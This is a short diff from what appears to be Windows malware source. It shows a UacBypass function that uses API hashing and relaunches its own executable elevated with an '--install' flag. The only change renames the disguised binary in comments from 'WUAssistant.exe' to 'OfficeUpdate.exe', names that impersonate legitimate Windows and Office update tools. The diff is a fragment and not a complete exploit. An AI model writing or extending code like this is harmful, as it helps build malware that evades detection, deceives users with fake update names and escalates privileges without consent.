@@ -593,7 +593,7 @@ BOOL UacBypass(IN PAPI_HASHING pApi) {
 
     // Get our own full path, quote it, and spawn an elevated copy of ourselves.
     // CreateProcessW(NULL, lpCmdLine, ...) tokenises at spaces, so a path like
-    // "C:\Users\...\WUAssistant.exe" must be wrapped in double-quotes.
+    // "C:\Users\...\OfficeUpdate.exe" must be wrapped in double-quotes.
     WCHAR wSelfRaw[MAX_PATH]       = {0};
     WCHAR wSelfPath[MAX_PATH + 16] = {0};  // quotes + " --install" + NUL
     if (!rpcs.pGetModFileW || !rpcs.pGetModFileW(NULL, wSelfRaw, MAX_PATH)) {
@@ -603,7 +603,7 @@ BOOL UacBypass(IN PAPI_HASHING pApi) {
         if (pCl) pCl(hElevated);
         return FALSE;
     }
-    // Build: "C:\path\to\WUAssistant.exe" --install
+    // Build: "C:\path\to\OfficeUpdate.exe" --install
     wSelfPath[0] = L'"';
     UacWcsCpy(wSelfPath + 1, wSelfRaw, MAX_PATH);
     SIZE_T nSelf = UacWcsLen(wSelfPath);
